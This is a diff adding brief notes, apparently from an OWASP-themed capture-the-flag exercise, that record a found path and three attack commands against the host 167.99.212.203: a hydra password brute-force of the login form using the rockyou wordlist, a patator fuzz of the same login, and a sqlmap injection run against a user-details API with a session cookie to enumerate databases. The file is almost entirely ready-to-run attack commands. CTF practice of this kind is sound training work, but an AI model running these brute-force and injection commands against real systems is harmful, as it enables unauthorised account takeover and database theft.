@@ -1,0 +1,11 @@
+Found the follosing path:
+https://167.99.212.203/img/
+
+Brute force attack with passwords from wordlist:
+hydra -l admin-owasp@security-training.pl -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -f 167.99.212.203 -s 443 https-post-form "/login:username=^USER^&password=^PASS^:F=login-error"
+
+
+patator http_fuzz url="https://167.99.212.203/login" resolve=167.99.212.203:167.99.212.203 method=POST header='Content-Type: application/x-www-form-urlencoded' body="username=admin-owasp%40security-training.pl&password=FILE0" 0=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -t 25 &>> /var/ctf-2023/07-owasp-quiz/patator-output.txt
+
+
+sqlmap -u https://167.99.212.203/api/user-details --data="{\"username\":\"*\",\"password\":\"*\"}" --method PUT --cookie "JSESSIONID=9322CAB773CE5525605874BD4C030384" --dbs --batch
